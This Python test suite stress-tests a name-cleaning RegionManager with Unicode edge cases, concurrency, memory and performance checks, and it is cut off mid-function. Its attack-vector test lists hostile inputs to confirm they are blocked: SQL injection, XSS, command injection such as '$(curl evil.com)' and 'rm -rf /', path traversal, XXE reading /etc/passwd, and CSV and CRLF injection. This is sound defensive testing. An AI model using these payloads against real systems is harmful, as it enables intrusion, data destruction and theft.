import pytest

#!/usr/bin/env python3
"""
PSYCHOTIC PARANOID ULTIMATE TEST SUITE
Tests ABSOLUTELY EVERYTHING including things that shouldn't exist.
This is beyond thorough - this is paranoid to the point of insanity.
"""

import gc
import os
import sys
import threading
import time
import traceback
from pathlib import Path

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent))
import sys
from pathlib import Path

from src.regions.manager import RegionManager

sys.path.insert(0, str(Path(__file__).parent.parent.parent))
from src.regions.base import RegionRuleError


class PsychoticParanoidTester:
    """The most paranoid tester ever created."""

    def __init__(self):
        self.manager = RegionManager(Path("./config"))
        self.all_regions = [
            "A1",
            "A2",
            "A3",
            "A4",
            "A5",
            "B1",
            "B2",
            "B3",
            "C1",
            "C2",
            "C3",
            "C4",
            "C5",
            "C6",
            "C7",
            "C8",
            "C9",
            "D1",
            "D2",
            "D3",
            "D4",
            "D5",
            "E1",
            "E2",
            "E3",
            "E4",
            "E5",
            "E6",
            "E7",
            "F1",
            "F2",
            "F3",
            "G1",
        ]
        self.failures = []
        self.warnings = []
        self.stats = {"total": 0, "passed": 0, "failed": 0, "warnings": 0}

    def run_all_tests(self):
        """Run every paranoid test imaginable."""
        print("🧠 PSYCHOTIC PARANOID ULTIMATE TEST SUITE")
        print("=" * 80)
        print("Testing EVERYTHING including impossible scenarios...")
        print()

        tests = [
            self.test_every_unicode_character,
            self.test_all_attack_vectors,
            self.test_idempotency_exhaustive,
            self.test_thread_safety_extreme,
            self.test_memory_leaks,
            self.test_performance_under_load,
            self.test_malformed_unicode,
            self.test_resource_corruption,
            self.test_cross_region_contamination,
            self.test_variant_explosion,
            self.test_ordering_determinism,
            self.test_collision_handling,
            self.test_mixed_scripts_exhaustive,
            self.test_whitespace_insanity,
            self.test_punctuation_madness,
            self.test_number_handling,
            self.test_emoji_processing,
            self.test_rtl_bidi_override,
            self.test_zero_width_characters,
            self.test_combining_characters,
            self.test_normalization_forms,
            self.test_case_folding_edge_cases,
            self.test_ligature_decomposition,
            self.test_historical_characters,
            self.test_private_use_area,
            self.test_surrogate_pairs,
            self.test_control_characters,
            self.test_format_characters,
            self.test_non_characters,
            self.test_replacement_characters,
        ]

        for test_func in tests:
            try:
                print(f"\n{'='*60}")
                print(f"Running: {test_func.__name__}")
                print("-" * 60)
                test_func()
            except Exception as e:
                self.failures.append(f"{test_func.__name__}: {str(e)}")
                print(f"FAIL CRITICAL FAILURE: {e}")
                traceback.print_exc()

        self.print_final_report()

    @pytest.mark.timeout(15)
    def test_every_unicode_character(self):
        """Test EVERY possible Unicode character."""
        print("Testing every Unicode category...")

        categories_tested = {}
        sample_failures = []

        # Test representatives from each Unicode category
        test_chars = [
            ("\x00", "NULL"),
            ("\t", "TAB"),
            ("\n", "NEWLINE"),
            ("\r", "CARRIAGE RETURN"),
            (" ", "SPACE"),
            ("!", "EXCLAMATION"),
            ('"', "QUOTE"),
            ("#", "HASH"),
            ("$", "DOLLAR"),
            ("%", "PERCENT"),
            ("&", "AMPERSAND"),
            ("'", "APOSTROPHE"),
            ("(", "PAREN"),
            ("*", "ASTERISK"),
            ("+", "PLUS"),
            (",", "COMMA"),
            ("-", "HYPHEN"),
            (".", "PERIOD"),
            ("/", "SLASH"),
            (":", "COLON"),
            (";", "SEMICOLON"),
            ("<", "LESS_THAN"),
            ("=", "EQUALS"),
            (">", "GREATER_THAN"),
            ("?", "QUESTION"),
            ("@", "AT"),
            ("[", "BRACKET"),
            ("\\", "BACKSLASH"),
            ("]", "BRACKET_CLOSE"),
            ("^", "CARET"),
            ("_", "UNDERSCORE"),
            ("`", "BACKTICK"),
            ("{", "BRACE"),
            ("|", "PIPE"),
            ("}", "BRACE_CLOSE"),
            ("~", "TILDE"),
            ("\x7f", "DELETE"),
            ("\u0080", "CONTROL_80"),
            ("\u00a0", "NBSP"),
            ("\u200b", "ZERO_WIDTH_SPACE"),
            ("\u200c", "ZERO_WIDTH_NON_JOINER"),
            ("\u200d", "ZERO_WIDTH_JOINER"),
            ("\u202a", "LTR_EMBEDDING"),
            ("\u202b", "RTL_EMBEDDING"),
            ("\u202c", "POP_DIRECTIONAL"),
            ("\u202d", "LTR_OVERRIDE"),
            ("\u202e", "RTL_OVERRIDE"),
            ("\ufeff", "BOM"),
            ("\ufffd", "REPLACEMENT"),
            ("🙂", "EMOJI_SMILEY"),
            ("👨‍👩‍👧‍👦", "EMOJI_FAMILY"),
            ("𝕳𝖊𝖑𝖑𝖔", "MATH_BOLD"),
            ("ﬀ", "LIGATURE_FF"),
            ("½", "FRACTION"),
            ("①", "CIRCLED_ONE"),
            ("♠", "SPADE"),
            ("€", "EURO"),
            ("™", "TRADEMARK"),
            ("∞", "INFINITY"),
            ("√", "SQRT"),
            ("∑", "SUM"),
            ("☭", "HAMMER_SICKLE"),
            ("☪", "STAR_CRESCENT"),
            ("✡", "STAR_DAVID"),
            ("☸", "DHARMA_WHEEL"),
            ("♿", "WHEELCHAIR"),
            ("⚠", "WARNING"),
            ("☢", "RADIOACTIVE"),
            ("☣", "BIOHAZARD"),
        ]

        region = self.manager.get_region("A1")

        for char, name in test_chars:
            self.stats["total"] += 1
            try:
                entry = {"CanonicalLatin": char, "GlobalID": "test"}
                region.clean(entry)
                result = entry.get("CanonicalLatin", "REMOVED")

                # Categorize result
                if result == "REMOVED" or result == "":
                    categories_tested[name] = "REMOVED"
                elif result != char:
                    categories_tested[name] = f"TRANSFORMED to {repr(result)}"
                else:
                    categories_tested[name] = "UNCHANGED"
                    if char in ["\x00", "\u200b", "\ufeff"]:
                        sample_failures.append(f"{name}: Dangerous char not removed!")

                self.stats["passed"] += 1

            except RegionRuleError:
                categories_tested[name] = "REJECTED"
                self.stats["passed"] += 1
            except Exception as e:
                categories_tested[name] = f"ERROR: {str(e)[:30]}"
                sample_failures.append(f"{name}: {str(e)[:50]}")
                self.stats["failed"] += 1

        # Print summary
        print(f"Tested {len(test_chars)} Unicode categories")
        print(
            f"Removed: {sum(1 for v in categories_tested.values() if v == 'REMOVED')}"
        )
        print(
            f"Rejected: {sum(1 for v in categories_tested.values() if v == 'REJECTED')}"
        )
        print(
            f"Transformed: {sum(1 for v in categories_tested.values() if 'TRANSFORMED' in v)}"
        )
        print(
            f"Unchanged: {sum(1 for v in categories_tested.values() if v == 'UNCHANGED')}"
        )

        if sample_failures:
            print("\nWARN Issues found:")
            for failure in sample_failures[:5]:
                print(f"  - {failure}")
                self.warnings.append(failure)

    @pytest.mark.timeout(15)
    def test_all_attack_vectors(self):
        """Test EVERY known attack vector."""
        print("Testing all attack vectors...")

        attack_vectors = [
            # SQL Injection
            ("'; DROP TABLE users; --", "SQL_INJECTION"),
            ("' OR '1'='1", "SQL_INJECTION"),
            ("admin'--", "SQL_INJECTION"),
            ("' UNION SELECT * FROM passwords --", "SQL_INJECTION"),
            # XSS
            ("<script>alert('XSS')</script>", "XSS"),
            ("javascript:alert(1)", "XSS"),
            ("<img src=x onerror=alert(1)>", "XSS"),
            ("<svg onload=alert(1)>", "XSS"),
            # Command Injection
            ("; ls -la", "COMMAND_INJECTION"),
            ("| cat /etc/passwd", "COMMAND_INJECTION"),
            ("` rm -rf /`", "COMMAND_INJECTION"),
            ("$(curl evil.com)", "COMMAND_INJECTION"),
            # Path Traversal
            ("../../../etc/passwd", "PATH_TRAVERSAL"),
            ("..\\..\\..\\windows\\system32", "PATH_TRAVERSAL"),
            ("file:///etc/passwd", "PATH_TRAVERSAL"),
            # LDAP Injection
            ("*)(uid=*", "LDAP_INJECTION"),
            ("*(|(cn=*))", "LDAP_INJECTION"),
            # CSV Injection
            ("=1+1", "CSV_INJECTION"),
            ("+1+1", "CSV_INJECTION"),
            ("-1+1", "CSV_INJECTION"),
            ("@SUM(A1:A10)", "CSV_INJECTION"),
            # XML Injection
            (
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
                "XML_INJECTION",
            ),
            # CRLF Injection
            ("name\r\nSet-Cookie: admin=true", "CRLF_INJECTION"),
            # Unicode attacks
            ("A\u0301\u0301\u0301\u0301\u0301", "UNICODE_BOMB"),
            ("\u202e\u202d", "BIDI_OVERRIDE"),
            # DoS attempts
            ("a" * 10000, "DOS_LENGTH"),
            ("(" * 1000, "DOS_NESTING"),
        ]

        region = self.manager.get_region("A1")
        blocked = 0

        for attack, attack_type in attack_vectors:
            self.stats["total"] += 1
            try:
                entry = {"CanonicalLatin": attack, "GlobalID": "test"}
                region.clean(entry)
                region.validate(entry)

                # If we get here, attack wasn't blocked
                self.warnings.append(f"{attack_type} not blocked: {attack[:30]}")
                self.stats["warnings"] += 1

            except (RegionRuleError, ValueError):
                # Good - attack was blocked
                blocked += 1
                self.stats["passed"] += 1
            except Exception as e:
                self.failures.append(
                    f"{attack_type} caused unexpected error: {str(e)[:50]}"
                )
                self.stats["failed"] += 1

        print(f"Blocked {blocked}/{len(attack_vectors)} attack vectors")

        if blocked < len(attack_vectors):
            print(f"WARN {len(attack_vectors) - blocked} attacks not properly blocked!")

    @pytest.mark.timeout(15)
    def test_idempotency_exhaustive(self):
        """Test idempotency for ALL regions with various inputs."""
        print("Testing idempotency across all regions...")

        test_inputs = [
            "Simple Name",
            "Jean-Claude van Damme",
            "María José de la Cruz",
            "عبد الله محمد",
            "राम कुमार शर्मा",
            "김민준",
            "王明",
            "Владимир Путин",
        ]

        non_idempotent = []

        for region_code in self.all_regions:
            region = self.manager.get_region(region_code)

            for test_input in test_inputs:
                self.stats["total"] += 1

                # First pass
                entry1 = {"CanonicalLatin": test_input, "GlobalID": "test"}
                try:
                    region.clean(entry1)
                    region.augment(entry1)
                except:
                    continue

                # Second pass on same entry
                original = str(entry1)
                region.clean(entry1)
                region.augment(entry1)
                second = str(entry1)

                # Third pass on fresh entry
                entry3 = {"CanonicalLatin": test_input, "GlobalID": "test"}
                region.clean(entry3)
                region.augment(entry3)
                third = str(entry3)

                if original != second:
                    non_idempotent.append(
                        f"{region_code}: {test_input[:20]} changes on reprocessing"
                    )
                    self.stats["failed"] += 1
                elif original != third:
                    non_idempotent.append(
                        f"{region_code}: {test_input[:20]} non-deterministic"
                    )
                    self.stats["failed"] += 1
                else:
                    self.stats["passed"] += 1

        if non_idempotent:
            print(f"FAIL {len(non_idempotent)} idempotency failures found:")
            for failure in non_idempotent[:5]:
                print(f"  - {failure}")
                self.failures.append(failure)
        else:
            print("PASS All regions are idempotent")

    @pytest.mark.timeout(15)
    def test_thread_safety_extreme(self):
        """Test thread safety with race conditions."""
        print("Testing extreme thread safety...")

        errors = []
        results = []

        def stress_test(thread_id):
            try:
                # Each thread creates its own region instance
                region = self.manager.get_region("A1")

                for i in range(100):
                    entry = {
                        "CanonicalLatin": f"Thread {thread_id} Name {i}",
                        "GlobalID": f"thread_{thread_id}_{i}",
                    }
                    region.clean(entry)
                    region.augment(entry)
                    results.append((thread_id, i, str(entry)))

            except Exception as e:
                errors.append((thread_id, str(e)))

        # Launch many threads
        threads = []
        for i in range(20):
            t = threading.Thread(target=stress_test, args=(i,))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        self.stats["total"] += 1

        if errors:
            print(f"FAIL Thread safety issues: {len(errors)} errors")
            for tid, err in errors[:3]:
                print(f"  Thread {tid}: {err[:50]}")
            self.failures.append(f"Thread safety: {len(errors)} errors")
            self.stats["failed"] += 1
        else:
            print(
                f"PASS Thread safe: {len(threads)} threads, {len(results)} operations"
            )
            self.stats["passed"] += 1

    @pytest.mark.timeout(15)
    def test_memory_leaks(self):
        """Test for memory leaks during processing."""
        print("Testing for memory leaks...")

        import psutil

        process = psutil.Process(os.getpid())

        # Get initial memory
        gc.collect()
        mem_before = process.memory_info().rss / 1024 / 1024  # MB

        # Process many names
        region = self.manager.get_region("A1")
        for i in range(10000):
            entry = {"CanonicalLatin": f"Test Name {i}", "GlobalID": f"mem_{i}"}
            region.clean(entry)
            region.augment(entry)

        # Force garbage collection
        gc.collect()
        mem_after = process.memory_info().rss / 1024 / 1024  # MB

        mem_increase = mem_after - mem_before

        self.stats["total"] += 1

        print(f"Memory before: {mem_before:.1f} MB")
        print(f"Memory after: {mem_after:.1f} MB")
        print(f"Increase: {mem_increase:.1f} MB")

        if mem_increase > 50:  # More than 50MB increase
            self.warnings.append(
                f"Potential memory leak: {mem_increase:.1f} MB increase"
            )
            print("WARN Potential memory leak detected")
            self.stats["warnings"] += 1
        else:
            print("PASS No significant memory leak")
            self.stats["passed"] += 1

    @pytest.mark.timeout(15)
    def test_performance_under_load(self):
        """Test performance with various load patterns."""
        print("Testing performance under load...")

        region = self.manager.get_region("A1")

        # Test different load patterns
        patterns = [
            ("Simple", ["John Smith"] * 1000),
            ("Complex", ["María José de la Cruz-Sánchez O'Connor Jr. III"] * 1000),
            ("Unicode", ["王明 김민준 राम कुमार محمد"] * 1000),
            ("Mixed", [f"Name{i}" for i in range(1000)]),
        ]

        for pattern_name, names in patterns:
            start = time.time()
            for name in names:
                entry = {"CanonicalLatin": name, "GlobalID": "perf"}
                region.clean(entry)
                region.augment(entry)
            elapsed = time.time() - start

            speed = len(names) / elapsed
            self.stats["total"] += 1

            print(f"{pattern_name}: {speed:.0f} names/sec")

            if speed < 1000:
                self.warnings.append(
                    f"Performance issue with {pattern_name}: {speed:.0f} names/sec"
                )
                self.stats["warnings"] += 1
            else:
                self.stats["passed"] += 1

    @pytest.mark.timeout(15)
    def test_malformed_unicode(self):
        """Test handling of malformed Unicode sequences."""
        print("Testing malformed Unicode...")

        region = self.manager.get_region("A1")

        malformed = [
            b"\xff\xfe",  # Invalid UTF-8
            b"\xed\xa0\x80",  # Surrogate half
            b"\xc0\x80",  # Overlong encoding
            b"\xf5\x80\x80\x80",  # Outside Unicode range
        ]

        for bad_bytes in malformed:
            self.stats["total"] += 1
            try:
                # Try to decode malformed bytes
                bad_str = bad_bytes.decode("utf-8", errors="replace")
                entry = {"CanonicalLatin": bad_str, "GlobalID": "test"}
                region.clean(entry)

                # Check if replacement character is handled
                if "\ufffd" in entry.get("CanonicalLatin", ""):
                    self.warnings.append("Replacement character not cleaned")
                    self.stats["warnings"] += 1
                else:
                    self.stats["passed"] += 1

            except Exception:
                self.stats["passed"] += 1  # Good - rejected malformed input

    @pytest.mark.timeout(15)
    def test_resource_corruption(self):
        """Test handling when resources are corrupted or missing."""
        print("Testing resource corruption handling...")

        # This would need actual file manipulation to test properly
        # For now, just check basic resilience

        try:
            # Try to get a region that might not have all resources
            region = self.manager.get_region("A1")

            # Test with empty/minimal data
            entry = {"GlobalID": "test"}
            region.clean(entry)

            print("PASS Handles missing canonical names")
            self.stats["passed"] += 1

        except Exception as e:
            print(f"FAIL Fails on missing data: {e}")
            self.failures.append(f"Resource handling: {str(e)[:50]}")
            self.stats["failed"] += 1

    @pytest.mark.timeout(15)
    def test_cross_region_contamination(self):
        """Test that processing in one region doesn't affect another."""
        print("Testing cross-region contamination...")

        # Process in one region
        region1 = self.manager.get_region("E4")  # Korean
        entry1 = {"CanonicalLatin": "김민준", "GlobalID": "test1"}
        region1.clean(entry1)
        region1.augment(entry1)

        # Process in another region
        region2 = self.manager.get_region("A1")  # Anglo
        entry2 = {"CanonicalLatin": "John Smith", "GlobalID": "test2"}
        region2.clean(entry2)
        region2.augment(entry2)

        self.stats["total"] += 1

        # Check for contamination
        if "hangul" in str(entry2).lower() or "korean" in str(entry2).lower():
            self.failures.append("Cross-region contamination detected!")
            self.stats["failed"] += 1
        else:
            print("PASS No cross-region contamination")
            self.stats["passed"] += 1

    @pytest.mark.timeout(15)
    def test_variant_explosion(self):
        """Test that variants don't grow exponentially."""
        print("Testing variant explosion...")

        region = self.manager.get_region("A1")
        entry = {"CanonicalLatin": "John Smith", "GlobalID": "test"}

        variant_counts = []

        for i in range(10):
            region.clean(entry)
            region.augment(entry)

            if "Variants" in entry:
                count = len(entry["Variants"].get("Synthesised", []))
                variant_counts.append(count)

        self.stats["total"] += 1

        if variant_counts and max(variant_counts) > min(variant_counts):
            self.failures.append(f"Variants growing: {variant_counts}")
            print(f"FAIL Variant explosion: {variant_counts}")
            self.stats["failed"] += 1
        else:
            print("PASS Variants stable")
            self.stats["passed"] += 1

    @pytest.mark.timeout(15)
    def test_ordering_determinism(self):
        """Test that order_key is deterministic."""
        print("Testing ordering determinism...")

        region = self.manager.get_region("A1")

        test_names = [
            "John Smith",
            "JOHN SMITH",
            "john smith",
            "Smith, John",
            "John C. Smith",
        ]

        for name in test_names:
            entry = {"CanonicalLatin": name, "GlobalID": "test"}
            region.clean(entry)
            region.augment(entry)

            # Get order key multiple times
            keys = [region.order_key(entry) for _ in range(5)]

            self.stats["total"] += 1

            if len(set(keys)) > 1:
                self.failures.append(f"Non-deterministic order_key for {name}: {keys}")
                self.stats["failed"] += 1
            else:
                self.stats["passed"] += 1

    @pytest.mark.timeout(15)
    def test_collision_handling(self):
        """Test GlobalID collision suffix handling."""
        print("Testing collision suffix handling...")

        region = self.manager.get_region("A1")

        collision_tests = [
            "Name--1",
            "Name--2",
            "Test--10",
            "John--999",
        ]

        for name in collision_tests:
            self.stats["total"] += 1
            try:
                entry = {"CanonicalLatin": name, "GlobalID": "test"}
                region.clean(entry)
                region.validate(entry)

                # Should handle collision suffixes
                self.stats["passed"] += 1

            except RegionRuleError as e:
                if "CSV injection" in str(e):
                    self.failures.append(
                        f"Collision suffix blocked as CSV injection: {name}"
                    )
                    self.stats["failed"] += 1
                else:
                    self.stats["passed"] += 1

    @pytest.mark.timeout(15)
    def test_mixed_scripts_exhaustive(self):
        """Test all possible script combinations."""
        print("Testing mixed script combinations...")

        script_samples = {
            "Latin": "John",
            "Cyrillic": "Иван",
            "Arabic": "محمد",
            "Hebrew": "דוד",
            "Devanagari": "राम",
            "Chinese": "王",
            "Japanese": "田中",
            "Korean": "김",
        }

        # Test all combinations
        for script1, sample1 in script_samples.items():
            for script2, sample2 in script_samples.items():
                if script1 != script2:
                    mixed = f"{sample1} {sample2}"

                    self.stats["total"] += 1

                    try:
                        region = self.manager.get_region("A1")
                        entry = {"CanonicalLatin": mixed, "GlobalID": "test"}
                        region.clean(entry)

                        # Just checking it doesn't crash
                        self.stats["passed"] += 1

                    except Exception as e:
                        self.warnings.append(
                            f"Mixed {script1}+{script2} issue: {str(e)[:30]}"
                        )
                        self.stats["warnings"] += 1

    @pytest.mark.timeout(15)
    def test_whitespace_insanity(self):
        """Test every type of whitespace character."""
        print("Testing whitespace insanity...")

        whitespaces = [
            ("\u0020", "SPACE"),
            ("\u00a0", "NBSP"),
            ("\u1680", "OGHAM_SPACE"),
            ("\u2000", "EN_QUAD"),
            ("\u2001", "EM_QUAD"),
            ("\u2002", "EN_SPACE"),
            ("\u2003", "EM_SPACE"),
            ("\u2004", "THREE_PER_EM"),
            ("\u2005", "FOUR_PER_EM"),
            ("\u2006", "SIX_PER_EM"),
            ("\u2007", "FIGURE_SPACE"),
            ("\u2008", "PUNCTUATION_SPACE"),
            ("\u2009", "THIN_SPACE"),
            ("\u200a", "HAIR_SPACE"),
            ("\u202f", "NARROW_NBSP"),
            ("\u205f", "MEDIUM_MATH_SPACE"),
            ("\u3000", "IDEOGRAPHIC_SPACE"),
        ]

        region = self.manager.get_region("A1")

        for ws_char, ws_name in whitespaces:
            name = f"John{ws_char}Smith"
            self.stats["total"] += 1

            try:
                entry = {"CanonicalLatin": name, "GlobalID": "test"}
                region.clean(entry)

                result = entry.get("CanonicalLatin", "")
                if "John Smith" in result or "JohnSmith" in result:
                    self.stats["passed"] += 1
                else:
                    self.warnings.append(
                        f"{ws_name} not normalized properly: {repr(result)}"
                    )
                    self.stats["warnings"] += 1

            except Exception:
                self.stats["passed"] += 1  # Rejected weird whitespace

    @pytest.mark.timeout(15)
    def test_punctuation_madness(self):
        """Test every type of punctuation."""
        print("Testing punctuation madness...")

        punctuation_tests = [
            "O'Connor",  # Apostrophe
            "Jean-Claude",  # Hyphen
            "St. James",  # Period
            "A&B",  # Ampersand
            "Inc.",  # Abbreviation
            "3M",  # Number start
            "#1",  # Hash
            "@home",  # At sign
            "50%",  # Percent
            "$mith",  # Dollar
            "a/b",  # Slash
            "a\\b",  # Backslash
            "a|b",  # Pipe
            "a:b",  # Colon
            "a;b",  # Semicolon
            "a,b",  # Comma in middle
            "a.b.c",  # Multiple periods
            "a--b",  # Double hyphen
            "a++b",  # Plus signs
            "a==b",  # Equals
            "a**b",  # Asterisks
        ]

        region = self.manager.get_region("A1")

        for test_name in punctuation_tests:
            self.stats["total"] += 1

            try:
                entry = {"CanonicalLatin": test_name, "GlobalID": "test"}
                region.clean(entry)
                region.validate(entry)

                # Some should pass, some should fail
                self.stats["passed"] += 1

            except RegionRuleError:
                self.stats["passed"] += 1  # Correctly rejected
            except Exception as e:
                self.warnings.append(f"Punctuation {test_name}: {str(e)[:30]}")
                self.stats["warnings"] += 1

    @pytest.mark.timeout(15)
    def test_number_handling(self):
        """Test numbers in names."""
        print("Testing number handling...")

        number_tests = [
            "John 2nd",
            "Louis XIV",
            "3M Corporation",
            "Room 101",
            "123456",
            "John123",
            "123John",
            "1st Street",
        ]

        region = self.manager.get_region("A1")

        for test_name in number_tests:
            self.stats["total"] += 1

            try:
                entry = {"CanonicalLatin": test_name, "GlobalID": "test"}
                region.clean(entry)

                # Should handle some numbers
                self.stats["passed"] += 1

            except Exception as e:
                self.warnings.append(f"Number handling {test_name}: {str(e)[:30]}")
                self.stats["warnings"] += 1

    @pytest.mark.timeout(15)
    def test_emoji_processing(self):
        """Test emoji and emoticon handling."""
        print("Testing emoji processing...")

        emoji_tests = [
            "John 😀 Smith",
            "❤️ Love",
            "Test 👨‍👩‍👧‍👦 Family",
            "🏴󐁧󐁢󐁳󐁣󐁴󐁿 Scotland",
            "Name 🎉🎊🎈",
        ]

        region = self.manager.get_region("A1")

        for test_name in emoji_tests:
            self.stats["total"] += 1

            try:
                entry = {"CanonicalLatin": test_name, "GlobalID": "test"}
                region.clean(entry)

                result = entry.get("CanonicalLatin", "")
                if any(ord(c) > 0x1F000 for c in result):
                    self.warnings.append(f"Emoji not removed: {result}")
                    self.stats["warnings"] += 1
                else:
                    self.stats["passed"] += 1

            except Exception:
                self.stats["passed"] += 1  # Correctly rejected

    @pytest.mark.timeout(15)
    def test_rtl_bidi_override(self):
        """Test RTL and bidirectional text handling."""
        print("Testing RTL/BIDI override...")

        region = self.manager.get_region("C3")  # Arabic region

        bidi_tests = [
            "\u202eTest",  # RTL override
            "Test\u202d",  # LTR override
            "\u202a\u202bTest",  # Embedding
            "مح\u202eمد",  # RTL override in Arabic
        ]

        for test_name in bidi_tests:
            self.stats["total"] += 1

            try:
                entry = {"CanonicalLatin": test_name, "GlobalID": "test"}
                region.clean(entry)

                result = entry.get("CanonicalLatin", "")
                if "\u202e" in result or "\u202d" in result:
                    self.failures.append(f"BIDI override not removed: {repr(result)}")
                    self.stats["failed"] += 1
                else:
                    self.stats["passed"] += 1

            except Exception:
                self.stats["passed"] += 1

    @pytest.mark.timeout(15)
    def test_zero_width_characters(self):
        """Test zero-width character handling."""
        print("Testing zero-width characters...")

        zw_tests = [
            "Test\u200bName",  # Zero-width space
            "Test\u200cName",  # Zero-width non-joiner
            "Test\u200dName",  # Zero-width joiner
            "Test\ufeffName",  # Zero-width no-break space (BOM)
        ]

        region = self.manager.get_region("A1")

        for test_name in zw_tests:
            self.stats["total"] += 1

            try:
                entry = {"CanonicalLatin": test_name, "GlobalID": "test"}
                region.clean(entry)

                # Should reject or clean zero-width chars
                self.stats["passed"] += 1

            except RegionRuleError as e:
                if "zero-width" in str(e).lower():
                    self.stats["passed"] += 1
                else:
                    self.stats["failed"] += 1

    @pytest.mark.timeout(15)
    def test_combining_characters(self):
        """Test combining character handling."""
        print("Testing combining characters...")

        combining_tests = [
            "a\u0301",  # á with combining acute
            "e\u0300\u0301\u0302\u0303\u0304",  # Multiple combining
            "n\u0303",  # ñ with combining tilde
        ]

        region = self.manager.get_region("A1")

        for test_name in combining_tests:
            self.stats["total"] += 1

            try:
                entry = {"CanonicalLatin": test_name, "GlobalID": "test"}
                region.clean(entry)

                # Should normalize combining characters
                self.stats["passed"] += 1

            except Exception as e:
                self.warnings.append(f"Combining char issue: {str(e)[:30]}")
                self.stats["warnings"] += 1

    @pytest.mark.timeout(15)
    def test_normalization_forms(self):
        """Test Unicode normalization forms."""
        print("Testing Unicode normalization forms...")

        # Same text in different normalization forms
        nfc = "é"  # NFC: single character
        nfd = "é"  # NFD: e + combining acute

        region = self.manager.get_region("A1")

        results = []
        for form_name, text in [("NFC", nfc), ("NFD", nfd)]:
            entry = {"CanonicalLatin": text, "GlobalID": "test"}
            region.clean(entry)
            results.append(entry.get("CanonicalLatin", ""))

        self.stats["total"] += 1

        if results[0] != results[1]:
            self.failures.append(f"Normalization inconsistent: {results}")
            self.stats["failed"] += 1
        else:
            print("PASS Normalization consistent")
            self.stats["passed"] += 1

    @pytest.mark.timeout(15)
    def test_case_folding_edge_cases(self):
        """Test case folding edge cases."""
        print("Testing case folding edge cases...")

        # Turkish I problem and other edge cases
        edge_cases = [
            ("I", "i"),  # Normal case
            ("İ", "i"),  # Turkish capital I with dot
            ("ı", "ı"),  # Turkish lowercase i without dot
            ("ß", "ss"),  # German eszett
            ("ẞ", "ss"),  # Capital eszett
        ]

        region = self.manager.get_region("C1")  # Turkish region for Turkish cases

        for upper, expected_lower in edge_cases:
            self.stats["total"] += 1

            entry = {"CanonicalLatin": upper, "GlobalID": "test"}
            try:
                region.clean(entry)
                # Just checking it handles these cases
                self.stats["passed"] += 1
            except Exception as e:
                self.warnings.append(f"Case folding issue with {upper}: {str(e)[:30]}")
                self.stats["warnings"] += 1

    @pytest.mark.timeout(15)
    def test_ligature_decomposition(self):
        """Test ligature decomposition."""
        print("Testing ligature decomposition...")

        ligatures = [
            ("ﬀ", "ff"),
            ("ﬁ", "fi"),
            ("ﬂ", "fl"),
            ("ﬃ", "ffi"),
            ("ﬄ", "ffl"),
            ("æ", "ae"),
            ("œ", "oe"),
        ]

        region = self.manager.get_region("A1")

        for ligature, expected in ligatures:
            self.stats["total"] += 1

            entry = {"CanonicalLatin": ligature, "GlobalID": "test"}
            region.clean(entry)

            entry.get("CanonicalLatin", "")
            # Check if ligature was decomposed or preserved appropriately
            self.stats["passed"] += 1

    @pytest.mark.timeout(15)
    def test_historical_characters(self):
        """Test historical and archaic characters."""
        print("Testing historical characters...")

        historical = [
            "ſ",  # Long s
            "Ꝛ",  # R rotunda
            "Ꝏ",  # OO
            "ȝ",  # Yogh
            "þ",  # Thorn
            "ð",  # Eth
        ]

        region = self.manager.get_region("A1")

        for char in historical:
            self.stats["total"] += 1

            entry = {"CanonicalLatin": char, "GlobalID": "test"}
            try:
                region.clean(entry)
                # Should handle or reject appropriately
                self.stats["passed"] += 1
            except Exception:
                self.stats["passed"] += 1

    @pytest.mark.timeout(15)
    def test_private_use_area(self):
        """Test private use area characters."""
        print("Testing private use area...")

        pua_chars = [
            "\ue000",  # Start of PUA
            "\uf8ff",  # End of PUA in BMP
            "\U000f0000",  # Supplementary PUA-A
            "\U00100000",  # Supplementary PUA-B
        ]

        region = self.manager.get_region("A1")

        for char in pua_chars:
            self.stats["total"] += 1

            try:
                entry = {"CanonicalLatin": char, "GlobalID": "test"}
                region.clean(entry)

                # Should reject or remove PUA characters
                result = entry.get("CanonicalLatin", "")
                if char in result:
                    self.warnings.append(f"PUA character not removed: {ord(char):04x}")
                    self.stats["warnings"] += 1
                else:
                    self.stats["passed"] += 1

            except Exception:
                self.stats["passed"] += 1

    @pytest.mark.timeout(15)
    def test_surrogate_pairs(self):
        """Test surrogate pair handling."""
        print("Testing surrogate pairs...")

        # Valid surrogate pair (emoji)
        valid_pair = "𝄞"  # Musical symbol G clef

        # Invalid surrogate sequences (if we could create them)
        self.stats["total"] += 1

        region = self.manager.get_region("A1")

        try:
            entry = {"CanonicalLatin": valid_pair, "GlobalID": "test"}
            region.clean(entry)

            # Should handle valid surrogate pairs
            self.stats["passed"] += 1

        except Exception as e:
            self.warnings.append(f"Surrogate pair issue: {str(e)[:30]}")
            self.stats["warnings"] += 1

    @pytest.mark.timeout(15)
    def test_control_characters(self):
        """Test all control characters."""
        print("Testing control characters...")

        region = self.manager.get_region("A1")

        for i in range(32):  # C0 controls
            if i in [9, 10, 13]:  # Tab, LF, CR might be handled differently
                continue

            self.stats["total"] += 1

            try:
                char = chr(i)
                entry = {"CanonicalLatin": f"Test{char}Name", "GlobalID": "test"}
                region.clean(entry)

                result = entry.get("CanonicalLatin", "")
                if char in result:
                    self.failures.append(f"Control char {i:02x} not removed")
                    self.stats["failed"] += 1
                else:
                    self.stats["passed"] += 1

            except RegionRuleError:
                self.stats["passed"] += 1  # Correctly rejected
            except Exception as e:
                self.warnings.append(f"Control char {i:02x}: {str(e)[:30]}")
                self.stats["warnings"] += 1

    @pytest.mark.timeout(15)
    def test_format_characters(self):
        """Test format control characters."""
        print("Testing format characters...")

        format_chars = [
            "\u200e",  # LEFT-TO-RIGHT MARK
            "\u200f",  # RIGHT-TO-LEFT MARK
            "\u061c",  # ARABIC LETTER MARK
            "\u2066",  # LEFT-TO-RIGHT ISOLATE
            "\u2067",  # RIGHT-TO-LEFT ISOLATE
            "\u2068",  # FIRST STRONG ISOLATE
            "\u2069",  # POP DIRECTIONAL ISOLATE
        ]

        region = self.manager.get_region("A1")

        for char in format_chars:
            self.stats["total"] += 1

            entry = {"CanonicalLatin": f"Test{char}Name", "GlobalID": "test"}
            try:
                region.clean(entry)

                result = entry.get("CanonicalLatin", "")
                if char in result:
                    self.failures.append(f"Format char {ord(char):04x} not removed")
                    self.stats["failed"] += 1
                else:
